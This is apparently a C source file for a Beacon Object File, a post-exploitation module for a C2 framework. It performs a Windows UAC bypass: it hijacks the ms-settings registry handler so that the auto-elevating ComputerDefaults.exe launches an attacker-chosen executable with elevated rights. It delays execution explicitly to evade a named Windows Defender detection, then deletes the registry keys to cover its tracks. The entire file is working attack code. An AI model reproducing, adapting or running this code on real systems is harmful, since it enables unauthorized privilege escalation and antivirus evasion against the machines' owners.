// x86_64-w64-mingw32-gcc -c RegistryShellCommandBOF.c -w -o /share/test.o
// .\COFFLoader64.exe go .\test.o 2f0000002b000000433a5c55736572735c72616e64795c4465736b746f705c746573745c6d657373616765626f782e65786500
#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "beacon.h"

// define required winapi functions
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsA(LPCSTR pszPath);
DECLSPEC_IMPORT WINBASEAPI wchar_t WINAPI MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);
DECLSPEC_IMPORT WINBASEAPI LPSTR WINAPI MSVCRT$strcat(char *strDestination, const char *strSource);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteTreeA(HKEY base, LPCSTR subkey);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSaveKeyExA(HKEY hKey,LPCSTR lpFile,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD Flags);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,CONST BYTE *lpData,DWORD cbData);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI SHELL32$ShellExecuteExA(SHELLEXECUTEINFOA *pExecInfo);

int go(char * args, unsigned long length) {
    // get arguments
    datap parser;
    BeaconDataParse(&parser, args, length);
    unsigned char * cmdPath = BeaconDataExtract(&parser, NULL);

    char tempPath[MAX_PATH] = {0};
    MSVCRT$strcpy(tempPath, cmdPath);

    if(!SHLWAPI$PathFileExistsA(tempPath)){
        BeaconPrintf(CALLBACK_ERROR, "The target executable does not exist on host!\n");
        return 1;
    }

    // Create command reg key and/or open handle to it
    HKEY commandKey;
    LSTATUS regStatus = ADVAPI32$RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &commandKey);
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error creating command registry key!: %d\n", regStatus);
        return 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created registry key: HKCU:Software\\Classes\\ms-settings\\Shell\\Open\\command\n");
    }

    // set command reg key to supplied exe on disk
    regStatus = ADVAPI32$RegSetValueExA(commandKey, "", 0, REG_SZ, tempPath, MSVCRT$strlen(tempPath));
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting command registry key!: %d\n", regStatus);
        return 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully set command registry value\n");
    }

    // set DelegateExecute reg key to blank value
    regStatus = ADVAPI32$RegSetValueExA(commandKey, "DelegateExecute", 0, REG_SZ, "", 0);
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error setting DelegateExecute registry key!: %d\n", regStatus);
        return 1;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully set DelegateExecute registry value\n");
    }

    ADVAPI32$RegCloseKey(commandKey);

    // Sleep for 10 seconds before executing autoelevated exe to bypass Windows Defender behavioral detection: Behavior:Win32/UACBypassExp.T!proc
    KERNEL32$Sleep(10000);

    // Set variables for SHELLEXECUTEINFO object to execute fodhelper.exe or ComputerDefaults.exe
    SHELLEXECUTEINFOA exInfo;
    exInfo.lpVerb       = "open";
    exInfo.lpFile       = "C:\\Windows\\System32\\ComputerDefaults.exe";
    exInfo.nShow        = 0;
    exInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
    exInfo.cbSize       = sizeof(SHELLEXECUTEINFO);
    exInfo.hwnd         = 0;
    exInfo.lpParameters = 0;
    exInfo.lpDirectory  = 0;
    exInfo.hInstApp     = 0;

    // Execute the autoelevated exe
    BOOL shRet = SHELL32$ShellExecuteExA(&exInfo);
    if (shRet == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "Error using ShellExecuteEx!\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Autoelevated EXE was successfully executed using ShellExecuteEx!\n");
    }

    // Sleep for 2 seconds to make sure registry has been updated
    KERNEL32$Sleep(2000);

    // Open handle to "HKCU:Software\Classes" registry key
    HKEY fullRegKey;
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Classes", 0, KEY_READ | KEY_WRITE | DELETE, &fullRegKey) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error opening Software key!\n");
        return 1;
    }

    // Delete added registry key and all it's sub keys
    regStatus = ADVAPI32$RegDeleteTreeA(fullRegKey, "ms-settings");
    if (regStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Error deleting command registry key!: %d\n", regStatus);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully deleted registry key: HKCU:Software\\Classes\\ms-settings\\Shell\\Open\\command\n");
    }

    ADVAPI32$RegCloseKey(fullRegKey);

    return 0;
}